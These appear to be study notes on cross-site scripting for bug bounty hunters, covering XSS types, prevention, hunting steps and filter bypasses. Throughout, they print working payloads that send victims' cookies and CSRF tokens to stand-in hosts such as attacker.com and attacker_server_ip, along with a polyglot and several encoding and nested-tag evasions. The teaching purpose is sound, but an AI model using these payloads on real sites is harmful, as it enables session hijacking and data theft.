XSS - Cross Site Scripting 
==========================

    => If an application fails to distinguish between user input and the legitimate code that makes up a web page, 
    attackers can inject their own code into pages viewed by other users. The victim’s browser will then execute 
    the malicious script, which might steal cookies, leak personal information, change site contents, or redirect 
    the user to a malicious site. These malicious scripts are often JavaScript code but can also be HTML, Flash, 
    VBScript, or anything written in a language that the browser can execute.
    => A full tutorial on how to write HTML code is beyond the scope of this chapter, but you can use W3School’s 
    tutorial (https://www.w3schools.com/html/default.asp) as a resource.
    => Injected script can access any resources that the browser stores for that site, including cookies and session tokens. 
    Attackers can, therefore, use these scripts to steal information and bypass access control. For example, attackers might 
    steal user cookies by making the victim’s browser send a request to the attacker’s  IP with the victim’s cookie as a URL 
    parameter. 
        => ```
            <script>location="http://attacker.com";</script>
            <script src=http://attacker.com/xss.js></script>
            https://subscribe.example.com?email=<script>location="http://attacker.com";</script>

        ``` -> For URL Redirects
        => ```
            <script>
                image = new Image();
                image.src='http://attacker_server_ip/?c='+document.cookie;
            </script>
        ```
            => Loads an image from the attacker’s server, with the user’s cookies as part of the request. 
            GET request to the attacker’s IP, with the URL parameter c (for cookie) containing the user’s 
            document.cookie, which is the victim user’s cookie on the current site. In this way, attackers 
            can use the XSS to steal other users’ cookies by inspecting incoming requests on their server logs. 
            Note that if the session cookie has the HttpOnly flag set, JavaScript will not be able to read the cookie, 
            and therefore the attacker will not be able to exfiltrate it. Nevertheless, XSS can be used to execute 
            actions on the victim’s behalf, modify the web page the victim is viewing, and read the victim’s sensitive 
            information, such as CSRF tokens, credit card numbers, and any other details rendered on their page.

Types of XSS
============
    => Stored XSS vs Reflected XSS vs DOM-based XSS ::- The difference between these types is in how the XSS payload travels 
    before it gets delivered to the victim user. Some XSS flaws also fall into special categories: blind XSS and self-XSS, 
    which we’ll talk about in a bit.

    Stored XSS
    ==========
        => Happens when user input is stored on a server and retrieved unsafely. Browsers without sanitization, 
        malicious JavaScript code can make its way into the database and then to victims’ browsers. 
    Blind XSS 
    =========
        => Blind XSS vulnerabilities are stored XSS vulnerabilities whose malicious input is stored by the server 
        and executed in another part of the application or in another application that you cannot see.
            => When a user submits a Contract form, that input is not validated or sanitized in any way before it gets rendered 
            to the site’s admin page. An attacker can submit a message with JavaScript code and have that code executed by any 
            admin who views that message. These XSS flaws are harder to detect, since you can’t find them by looking for reflected 
            input in the server’s response, but they can be just as dangerous as regular stored XSS vulnerabilities. Often, blind 
            XSS can be used to attack administrators, exfiltrate their data, and compromise their accounts    
    Reflected XSS 
    =============
        => Happen when user input is returned to the user without being stored in a database. The application takes 
        in user input, processes it server-side, and immediately returns it to the user. These issues often happen when the server 
        relies on user input to construct pages that display search results or error messages. 
            => . For example, let’s say a site has a search functionality. The user can input a search term via a URL parameter, 
            and the page will display a message containing the term at the top of the results page. If a user searches abc, the 
            source code for the related message might look like this: 
                -> ```<h2>You searched for abc; here are the results!</h2>```
            => If the search functionality displays any user-submitted search string on the results page, a search term like the 
            following would cause a script to become embedded on the results page and executed by the browser:
                -> ```https://example.com/search?q=<script>alert('XSS by Vickie');</script>```
                -> If an attacker can trick victims into visiting this URL, the payload will become embedded in their version of 
                the page, making the victim’s browser run whatever code the attacker would like. Unlike stored XSS, which allows 
                attackers to execute code on anyone who accesses their stored resources, reflected XSS enables attackers to execute 
                code on the browsers of victims who click their malicious links.
    DOM-Based XSS
    =============
        => The difference is that the reflected XSS payload gets sent to the server and returned to the user’s browser within an 
        HTTP response. On the other hand, the DOM XSS payload is injected onto a page because of client-side code rendering user 
        input in an insecure manner. Although the results of the two attacks are similar, the processes of testing for them and 
        protecting against them are different.
        => In DOM-based XSS, the application takes in user input, processes it on the victim’s browser, and then returns it to the 
        user. DOM-based XSS targets a web page’s DOM directly: it attacks the client’s local copy of the web page instead of going 
        through the server. Attackers are able to attack the DOM when a page takes user-supplied data and dynamically alters the DOM 
        based on that input. 
            => JavaScript libraries like jQuery are prone to DOM-based XSS since they dynamically alter DOM elements. Since it happens \
            on DOM level it doesn't change HTTP response.
            => If website allows the user to change their Welcome by submitting it via a URL parameter: ?msg=Hello+World then replace it
            ?msg=<script>location='http://attacker_server_ip/?c='+document.cookie;</script> which embed the payload on the user’s web 
            page, and the victim’s browser will execute the malicious script.
        => The user input fields that can lead to reflected and DOM-based XSS aren’t always URL parameters. Sometimes they show up as 
        URL fragments or pathnames. URL fragments are strings, located at the end of a URL, that begin with a # character. They are 
        often used to automatically direct users to a section within a web page or transfer additional information.Ex:- #about_us, #contact_us, 
        => PortSwigger article “DOM-Based XSS” at https://portswigger.net/web-security/cross-site-scripting/dom-based/
    Self-XSS
    ========
        => Self-XSS attacks require victims to input a malicious payload themselves. To perform these, attackers must trick users into 
        doing much more than simply viewing a page or browsing to a particular URL.

Prevention
==========
    => robust input validation and contextual output escaping and encoding. Applications should never insert user-submitted data 
    directly into an HTML document—including, for example, inside <script> tags, HTML tag names, or attribute names. the server 
    should validate that user-submitted input, also can use XSS middlewares
    => Escaping refers to the practice of encoding special characters so that they are interpreted literally instead of as a special 
    character by the programs or machines that process the characters. Applications will need to encode the user input based on 
    where it will be embedded. If the user input is inserted into <script> tags, it needs to be encoded in JavaScript format. 
    The same goes for input inserted into HTML, XML, JSON, and CSS files.
    => Escaping ensures that browsers won’t misinterpret these characters as code to execute. Many XSS vulnerabilities can be 
    prevented by choosing the right JavaScript like React & Vue.js. The applications should implement client-side input validation 
    before it is inserted into the DOM. 
    => You can also take measures to mitigate the impact of XSS flaws if they do happen. First, you can set the HttpOnly flag on 
    sensitive cookies that your site uses to prevents attackers from stealing those cookies via XSS. You should also implement the 
    "Content-Security-Policy" HTTP response header which lets you restrict how resources such as JavaScript, CSS, or images load on 
    your web pages. 
    => To prevent XSS, you can instruct the browser to execute only scripts from a list of sources. For more information 
    about preventing XSS attacks, visit the OWASP XSS prevention cheat sheet, https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html.

Hunting for XSS
===============
    => where user input gets rendered on a page, process will vary for the different types of XSS, but the central principle remains 
    the same: check for reflected user input. But it’s important to remember that XSS vulnerabilities can also arise outside normal 
    web applications. You can hunt for XSS in applications that communicate via non-HTTP protocols such as SMTP, SNMP, and DNS. 
    Sometimes commercial apps such as email apps and other desktop apps receive data from these protocols. If you are interested in 
    these techniques, you can check out Offensive Security’s Advanced Web Attacks and Exploitation training: 
    https://www.offensive-security.com/awae-oswe/. Make sure to have BurpSuite and configured your proxy to work with your browser.

    => Step 1: Look for Input Opportunities::- 
        -> user input,  forms, search boxes, and name and username fields in sign-ups. Places where input gets stored by the server 
        and later displayed to the user,  including comment fields, user profiles, and blog posts.
        -> Sometimes drop-down menus or numeric fields can allow you to perform XSS, because even if you can’t enter your payload on 
        your browser, your proxy might let you insert it directly into the request. 
    => Step 2: Insert Payloads::- 
        -> Test XSS payload at the discovered injection points. The simplest payload to test with is an  alert box. But this payload 
        won’t work in typical web applications, because most websites nowadays implement some sort of XSS protection on their input 
        fields.
        -> A simple payload like this one is more likely to work on IoT or embedded applications that don’t use the latest frameworks. 
        If you are interested in IoT vulnerabilities, check out OWASP’s IoTGoat project at  https://github.com/OWASP/IoTGoat/. As XSS 
        defenses become more advanced, the XSS payloads that get around these defenses grow more complex too.

        More Than a <script> Tag
        ========================
            => <script> tags isn’t the only way to get your scripts executed in victim browsers. There are a few other tricks. First, 
            you can change the values of attributes in HTML tags. Some HTML attributes allow you to specify a script to run if certain 
            conditions are met. onload, onclick, onerror, etc. If you can insert code into these attributes, or even add a new event 
            attribute into an HTML tag, you can create an XSS.
                => Ex:- ```
                    <img onload=alert('The image has been loaded!') src="example.png">
                ```
            => Another way to achieve XSS is through special URL schemes, like javascript: and data:. The javascript: URL scheme 
            allows you to execute JavaScript code specified in the URL. Ex:-, entering this URL will cause an alert box with the 
            text XSS by Vickie to appear: ```javascript:alert('XSS by Vickie')```
            
            => This means that if you make the user load a javascript: URL, you can achieve XSS as well. Data URLs, those 
            that use the data: scheme, allow you to embed small files in a URL. You can use these to embed JavaScript code 
            into URLs too: ```data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIGJ5IFZpY2tpZScpPC9zY3JpcHQ+"```
            
            => This URL will also generate an alert box, because the included data in the data URL is the base64-encoded 
            version of the following script: ```<script>alert('XSS by Vickie')</script>```
            
            => Documents contained within data: URLs do not need to be base64 encoded. For example, you can embed the JavaScript 
            directly in the URL as follows, but base64 encoding can often help you bypass XSS filters: ```data:text/html,<script>alert('XSS by Vickie')</script>```
                
            => You can utilize these URLs to trigger XSS when a site allows URL input from users. A site might allow the user to 
            load an image by using a URL and use it as their profile picture, like this: https://example.com/upload_profile_pic?url=IMAGE_URL
                => The application will then render a preview on the web page by inserting the URL into an <img> tag. If you insert a 
                JavaScript or data URL, you can trick the victim’s browser into loading your JavaScript code: <img src="IMAGE_URL"/>
        
        => There are many more ways to execute JavaScript code to bypass XSS protection. You can find more example payloads on 
        PortSwigger at https://portswigger.net/web-security/cross-site-scripting/cheat-sheet/. Different browsers also support different 
        tags and event handlers, so you should always test by using multiple browsers when hunting for XSS.

        Closing Out HTML Tags
        =====================
            => When inserting an XSS payload, you’ll often have to close out a previous HTML tag by including its closing angle 
            bracket to avoid syntax errors. ```"/><script>location="http://attacker.com";</script>``` 

            Common XSS payloads online
            ==========================
                <script>alert(1)</script>
                =========================
                    => This is the most generic XSS payload. It will generate a popup box if the payload succeeds.
                <body onload=alert(1)>
                ======================
                    => This payload is useful when your input string can’t contain the term script. It inserts an HTML element 
                    that will run JavaScript automatically after it’s loaded.
                <script>alert(1)<!–
                ===================
                    => <!- is the start of an HTML comment. This payload will comment out the rest of the line in the HTML document 
                    to prevent syntax errors.
                <iframe src=javascript:alert(1)>
                ================================ 
                    => This payload loads JavaScript code within an iframe. It’s useful when <script> tags are banned by the XSS filter.
                "><img src=x onerror=prompt(1);>
                ================================ 
                    => This payload closes out the previous tag. It then injects an <img> tag with an invalid source URL. Once 
                    the tag fails to load, it will run the JavaScript specified in the onerror attribute.
                <a onmouseover"alert(1)">test</a>    
                ===================================
                    => This payload inserts a link that will cause JavaScript to execute after a user hovers over the link 
                    with their cursor.
                <script src=//attacker.com/test.js>  
                ===================================
                    => This payload causes the browser to load and run an external script hosted on the attacker’s server.

            => Hackers have designed many more creative payloads. Search XSS payloads online for more ideas. That said, taking a 
            long list of payloads and trying them one by one can be time-consuming and unproductive. Another way of approaching 
            manual XSS testing is to insert an XSS polyglot, a type of XSS payload that executes in multiple contexts. Ex:-, 
            it will execute regardless of whether it is inserted into an <img> tag, a <script> tag, or a generic <p> tag and can 
            bypass some XSS filters. Take a look at this polyglot payload published by EdOverflow at https://polyglot.innerht.ml/
            => ```
                javascript:"/*\"/*`/*' /*</template>
                </textarea></noembed></noscript></title>
                </style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>
            ```
                => The details of this payload are beyond the scope of the book, but it contains multiple ways of creating an XSS—so 
                if one method fails, another one can still induce the XSS. 
                => Another way of testing for XSS more efficiently is to use generic test strings instead of XSS payloads. Insert a 
                string of special HTML characters often used in XSS payloads, such as the following: >'<"//:=;!--. Take note of which 
                ones the application escapes and which get rendered directly. Then you can construct test XSS payloads from the 
                characters that you know the application isn’t properly sanitizing.
                
                => Blind XSS flaws are harder to detect; since you can’t detect them by looking for reflected input, you can’t test 
                for them by trying to generate an alert box. Instead, try making the victim’s browser generate a request to a server 
                you own. Ex:-, you can submit the following payload, which will make the victim’s browser request the page /xss on 
                your server: <script src='http://YOUR_SERVER_IP/xss'></script>

                => Then, you can monitor your server logs to see if anyone requests that page. If you see a request to the path /xss, 
                a blind XSS has been triggered! Tools like XSS Hunter (https://xsshunter.com/features) can automate this process.

    Step 3: Confirm the Impact
    ==========================
        => Check for your payload on the destination page. Be aware that sites might also use user input to construct something 
        other than the next returned web page. Your input could show up in future web pages, email, and file portals. A time delay 
        also might occur between when the payload is submitted and when the user input is rendered. This situation is common in 
        log files and analytics pages. If you’re targeting these, your payload might not execute until later, or in another user’s 
        account. And certain XSS payloads will execute under only certain contexts, such as when an admin is logged in or when the 
        user actively clicks, or hovers over, certain HTML elements. Confirm the impact of the XSS payload by browsing to the 
        necessary pages and performing those actions.

Bypassing XSS Protection
========================
    => Most applications now implement some sort of XSS protection in their input fields. Often, they’ll use a blocklist to filter 
    out dangerous expressions that might be indicative of XSS. Here are some strategies for bypassing this type of protection.
    
    Alternative JavaScript Syntax
    =============================
        => Often, applications will sanitize <script> tags in user input. If that is the case, try executing XSS that doesn’t use 
        a <script> tag. For example, remember that in certain scenarios, you can specify JavaScript to run in other types of tags. 
        When you try to construct an XSS payload, you can also try to insert code into HTML tag names or attributes instead. Say user 
        input is passed into an HTML image tag, like this: ```<img src="USER_INPUT">```
        
        => Instead of closing out the image tag and inserting a script tag, like this: 
            <img src="/><script>alert('XSS by Vickie');</script>"/>
        You can insert the JavaScript code directly as an attribute to the current tag:
            <img src="123" onerror="alert('XSS by Vickie');"/>

        => Another way of injecting code without the <script> tag is to use the special URL schemes mentioned before. This snippet 
        will create a Click me!. link that will generate an alert box when clicked: 
            <a href="javascript:alert('XSS by Vickie')>Click me!</a>"

    Capitalization and Encoding
    ===========================
        => You can also mix different encodings and capitalizations to confuse the XSS filter. For example, if the filter filters 
        for only the string "script", capitalize certain letters in your payload. Since browsers often parse HTML code permissively 
        and will allow for minor syntax issues like capitalization, this won’t affect how the script tag is interpreted:
            => <scrIPT>location='http://attacker_server_ip/c='+document.cookie;</scrIPT>
        
        => If the application filters special HTML characters, like single and double quotes, you can’t write any strings into your 
        XSS payload directly. But you could try using the JavaScript fromCharCode() function, which maps numeric codes to the 
        corresponding ASCII characters, to create the string you need. For example, this piece of code is equivalent to the string 
        -------------------------------------------------------------------------------------------------------------------------
        | "http://attacker_server_ip/?c="   | String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107,    |
        |                                   |  101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61)        |
        -------------------------------------------------------------------------------------------------------------------------
            => This means you can construct an XSS payload without quotes, like this:
                ```
                    <scrIPT>location=String.fromCharCode(104, 116, 116, 112, 58, 47,
                    47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118,
                    101, 114, 95, 105, 112, 47, 63, 99, 61)+document.cookie;</scrIPT>
                ```
            => an online JavaScript editor, like https://js.do/
                ```
                    <script>
                        const ascii = (c) => c.charCodeAt();
                        encoded = "http://attacker_server_ip/?c=".split("").map(ascii);
                        document.write(encoded);
                    </script>
                ```

    Filter Logic Errors
    ===================
        => Finally, you could exploit any errors in the filter logic. For example, sometimes applications remove all <script> tags 
        in the user input to prevent XSS, but do it only once. If that’s the case, you can use a payload like this:
            => ```
                <scrip<script>t>
                    location='http://attacker_server_ip/c='+document.cookie;
                </scrip</script>t>
            ```
            => Notice that each <script> tag cuts another <script> tag in two. The filter won’t recognize those broken tags as 
            legitimate, but once the filter removes the intact tags from this payload, the rendered input becomes a perfectly
            valid piece of JavaScript code: ```<script>location='http://attacker_server_ip/c='+document.cookie;</script>```
            =>  For more filterbypass ideas, check out OWASP’s XSS filter evasion cheat sheet. You can also simply Google for 
            XSS filter bypass for more interesting articles. 
            Cheatsheet:- (https://owasp.org/www-community/xss-filter-evasion-cheatsheet). 

Escalating the Attack
=====================
    =>  Since scripts executed during an XSS attack run as the target page, the script is able to access any information on 
    that page. This means that you can use XSS to steal data and escalate your attack from there. This can be done by running 
    a script that sends the data back to you. For example, this code snippet reads the CSRF token embedded on the victim’s 
    page and sends it to the attacker’s server as a URL parameter named token. If you can steal a user’s CSRF tokens, you can 
    execute actions on their behalf by using those tokens to bypass CSRF protection on the site. 
        => ```
            var token = document.getElementsById('csrf-token')[0];
            var xhr = new XMLHttpRequest();
            xhr.open("GET", "http://attacker_server_ip/?token="+token, true);
            xhr.send(null);
        ```

Finding Your First XSS!
=======================
    => Look for user input opportunities on the application. When user input is stored and used to construct a 
    web page later, test the input field for stored XSS. If user input in a URL gets reflected back on the 
    resulting web page, test for reflected and DOM XSS.
    
    => Insert XSS payloads into the user input fields you’ve found. Insert payloads from lists online, a polyglot 
    payload, or a generic test string.
    
    => Confirm the impact of the payload by checking whether your browser runs your JavaScript code. Or in the 
    case of a blind XSS, see if you can make the victim browser generate a request to your server.
    
    => If you can’t get any payloads to execute, try bypassing XSS protections.
    
    => Automate the XSS hunting process with techniques introduced in
    
    => Consider the impact of the XSS you’ve found: who does it target? How many users can it affect? And what can 
    you achieve with it? Can you escalate the attack by using what you’ve found?
    
    => Send your first XSS report to a bug bounty program!